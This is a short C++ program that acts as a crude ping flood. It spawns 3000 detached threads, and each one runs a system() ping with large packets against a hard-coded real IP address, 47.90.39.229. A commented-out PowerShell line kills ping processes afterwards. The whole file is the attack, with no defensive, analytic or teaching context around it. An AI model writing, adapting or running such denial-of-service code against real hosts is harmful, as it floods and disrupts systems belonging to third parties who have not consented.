#include <bits/stdc++.h>

#include <string>
#include <iostream>
#include <cstdlib>
#include <list>
#include <future>
#include <chrono>
#include <thread>
#include <sstream>
#include <fstream>
#include <map>
#include <unordered_map>
using namespace std;


string cmd = "ping 47.90.39.229 -t -l 20000";

// string cmd = "Get-Process -Name ping | foreach-object{$_.kill()}";

// void func() {

// }
void Func() {
    system(cmd.c_str());
    return ;
}

int main(int argc, char const *argv[]) {
    cmd = "ping 47.90.39.229 -s 1000";

    // HANDLE ts[100];
    for (int i=0; i<3000; i++) {
        // cout<<"Number"<<i<<endl;
        std::thread(Func).detach();
    }
    // Sleep(10);
    
    // system(cmd.c_str());
    return 0;
}
